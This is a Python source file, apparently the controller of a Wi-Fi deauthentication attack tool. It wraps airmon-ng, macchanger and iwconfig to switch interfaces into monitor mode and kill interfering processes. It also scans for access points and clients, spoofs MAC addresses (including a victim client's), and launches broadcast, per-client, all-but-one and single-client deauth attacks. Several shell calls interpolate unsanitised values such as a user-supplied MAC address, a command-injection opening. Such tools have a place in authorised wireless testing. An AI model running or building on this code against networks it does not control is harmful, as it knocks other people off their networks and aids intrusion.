from .interface import Interface
from .menu_helper import print_message
from modules.scanner import Scanner
from modules.deauther import Deauther
import os
import re

class Manager:

    def __init__(self):
        self.interfaces = []
        self.chosen_interface = None
        self.targets = []
        self.chosen_target = None
        self.scanner = None
        self.deauther = None
        self.attack_type = 1
        self.spoofed = False
        self.ignore_mac = None
        self.target_client = None

    def read_interfaces(self):
        self.read_airmon_information()
        self.read_mac_addresses()
        self.read_interface_state()
        self.read_supported_bands_and_channels()
    
    def read_airmon_information(self):
        self.interfaces = []
        output = os.popen("airmon-ng").read()
        output = output.split("\n")
        index = 1
        for counter,line in enumerate(output):
            if counter > 2 and line.startswith("phy"):
                splitted_line = line.split("\t")
                remove_empty = [word for word in splitted_line if word]
                interface = Interface(str(index),remove_empty[0],remove_empty[1],remove_empty[2],remove_empty[3])
                self.interfaces.append(interface)
                index +=1

    def read_mac_addresses(self,update_current=False):    
        if update_current:
            output = os.popen(f"ip link show {self.chosen_interface.interface}").read()
            addr = re.search(r"([0-9a-fA-F]{2}[:]){5}([0-9a-fA-F]{2})",output).group(0)
            self.chosen_interface.mac_address = addr.upper()
        else:
            for interface in self.interfaces:
                output = os.popen(f"ip link show {interface.interface}").read()
                addr = re.search(r"([0-9a-fA-F]{2}[:]){5}([0-9a-fA-F]{2})",output).group(0)
                interface.mac_address = addr.upper()

    def read_interface_state(self,interface=None):
        if interface:
            interface.state = os.popen(f"cat /sys/class/net/{interface.interface}/operstate").read()
        else:
            for interface in self.interfaces:
                interface.state = os.popen(f"cat /sys/class/net/{interface.interface}/operstate").read()


    def read_supported_bands_and_channels(self,interface=None):
        def check_supp(interface): 
            output = os.popen(f"iwlist {interface.interface} freq").read()
            interface.bands = []
            interface.channels = []
            for line in output.split("\n"):
                if line.strip().startswith("Channel"):
                    for col in line.split(":"):
                        channel = col[0].split(' ')[1]
                        if channel.startswith("0"): 
                            channel = channel[1:]
                        interface.channels.append(channel)
                        if col[1].startswith("2") and "2.4GHz" not in interface.bands :
                            interface.bands.append("2.4GHz")
                            continue
                        if col[1].startswith("5") and "5GHz" not in interface.bands:
                            interface.bands.append("5GHz")
                            continue
        if interface:
            check_supp(interface)
        else:
            for interface in self.interfaces:
                check_supp(interface)


    def update_device_informations(self,mode):
        self.read_interfaces()
        if mode == "monitor":
            target_mode = self.chosen_interface.interface + "mon"
        else:
            target_mode = self.chosen_interface.interface[:len(self.chosen_interface.interface)-3]

        for interface in self.interfaces:
            if target_mode == interface.interface:
                self.chosen_interface = interface
                return True
        return False 
    
    def in_monitor_mode(self):
        if "mon" in self.chosen_interface.interface:
            print_message("Interface is already in monitor mode..","yellow")
            return True
        return False

    def check_trouble(self):
        output = os.popen("airmon-ng check").read()
        if len(output.split("\n")) > 3:
            output = output.replace(r"using 'airmon-ng check kill'","").replace('they will','they will maybe')
            return True,output
        else:
            return False,output

    def check_kill(self):
        print_message('Killing processes..','red')
        os.popen("airmon-ng check kill").read()
        print_message('Done','green')
    
    def clients_exists(self):
        if len(self.chosen_target.clients) > 0:
            return True
        else:
            print_message("No associated Clients available, try to scan again and find a network with clients.",'red')
            return False

    def select_interface(self,option):
        index = option - 1 
        self.chosen_interface = self.interfaces[index]
    
    def set_random_mac_address(self):
        self.set_interface_down()
        os.popen(f"macchanger -r {self.chosen_interface.interface} ").read()
        self.set_interface_up()
        self.read_mac_addresses(update_current=True)

    def set_custom_mac_address(self, custom_address):
        self.set_interface_down()
        os.popen(f"macchanger -m {custom_address} {self.chosen_interface.interface} ").read()
        self.set_interface_up()
        self.read_mac_addresses(update_current=True)

    def reset_mac_address(self):
        self.set_interface_down()
        os.popen(f"macchanger -p {self.chosen_interface.interface} ").read()
        self.set_interface_up()
        self.read_mac_addresses(update_current=True)

    def set_monitor_mode(self):
        os.popen(f"airmon-ng start {self.chosen_interface.interface}").read()
        success =  self.update_device_informations("monitor")
        if not success:
            print_message(f"Couldn't put '{self.chosen_interface.interface}' into monitor mode..",'red')
            return False
        return True
        
    def set_managed_mode(self):
        os.popen(f"airmon-ng stop {self.chosen_interface.interface}").read()
        return self.update_device_informations("managed")

    def set_interface_down(self):
        os.popen(f"ifconfig {self.chosen_interface.interface} down").read()

    def set_interface_up(self):
        os.popen(f"ifconfig {self.chosen_interface.interface} up").read()
    
    def set_interface_channel(self,interface_name,channel):
        os.popen(f"iwconfig {interface_name} channel {channel}").read()
    
    def start_scan(self):
        if self.chosen_interface.mode != "Monitor":
            print_message("Interface not in monitor mode! Putting into monitor mode automatically..",'yellow')
            success =  self.set_monitor_mode()
            if not success:
                return False
        self.scanner = Scanner(self.chosen_interface)
        self.scanner.start_scan()
        if not self.scanner.targets:
            return False
        self.targets = self.scanner.targets
        self.scanner.delete_old_file()
        return True
    
    def select_target(self,option):
        self.chosen_target = self.targets[option-1]

    def select_band(self,option):
        self.chosen_target = None
        self.chosen_interface.chosen_channel = None
        if option == 0:
            self.chosen_interface.chosen_band = None
        if option == True:
            self.chosen_interface.chosen_band = "bg" 
        if option == False:
            self.chosen_interface.chosen_band = "a" 

    def select_channel(self,option):
        self.chosen_target = None
        self.chosen_interface.chosen_band = None
        if option == 0:
            self.chosen_interface.chosen_channel = None
        self.chosen_interface.chosen_channel = str(option)

    def select_attack_type(self,option):
        """
            "Deauth all clients (broadcast)",
            "Deauth all clients (deauth every single)",
            "Deauth all clients except one (f.i yourself) ",
            "Deauth specific client",
        """
        if option == 1 or option == 2:
            self.ignore_mac = None
            self.target_client = None
        elif option == 3:
            self.target_client = None
        elif option == 4:
            self.ignore_mac = None
        if self.spoofed:
            print_message('You spoofed the address of a client. Therefore you are going to be disconnected','red',time_delay=3)
        self.attack_type = option          

    def select_target_client(self,option):
        client = self.chosen_target.clients[option-1]
        bssid = client.station
        self.target_client = bssid
    
    def spoof_mac_address_of_client(self,option):
        client = self.chosen_target.clients[option-1]
        bssid = client.station
        self.set_custom_mac_address(bssid)
    

    #TODO checken ob ap gewaehlt
    def start_deauth_attack(self):
        #for deauth use standard interface
        default_interface = self.chosen_interface.interface.replace('mon','')
        # set channel of default_interface to ap channel
        self.set_interface_channel(default_interface,self.chosen_target.channel)

        #* Broadcast deauth
        if self.attack_type == 1:
            self.deauther = Deauther(
                # 'test','test'
                default_interface,
                self.chosen_target.bssid,
                )
            self.deauther.start_broadcast_deauth_attack()
        #* deauth each separately
        if self.attack_type == 2:
            prepared_clients = [self.chosen_target.clients[i].station for i,client in enumerate(self.chosen_target.clients)]
            self.deauther = Deauther(
                default_interface,
                self.chosen_target.bssid,
                clients=prepared_clients
                )
            self.deauther.start_multi_client_deauth_attack() 
        #* deauth each separately except one
        if self.attack_type == 3:
            prepared_clients = [self.chosen_target.clients[i].station for i,client in enumerate(self.chosen_target.clients)]
            without_ignore_mac = [bssid for bssid in prepared_clients if bssid.lower() != self.ignore_mac.lower()]
            self.deauther = Deauther(
                default_interface,
                self.chosen_target.bssid,
                clients=without_ignore_mac
                )
            self.deauther.start_multi_client_deauth_attack() 
        #* deauth specific one
        if self.attack_type == 4:
            #* spoofing the target client mac is much more efficient
            self.set_custom_mac_address(self.target_client)
            self.deauther = Deauther(
                default_interface,
                self.chosen_target.bssid,
                client=self.target_client
                )
            self.deauther.start_specific_client_deauth_attack() 
        

    def get_attack_type(self):
        if self.attack_type == 1:
            return "Broadcast"
        elif self.attack_type == 2:
            return "Each sep."
        elif self.attack_type == 3:
            return "Each sep. ex."
        elif self.attack_type == 4:
            return "Specific cl."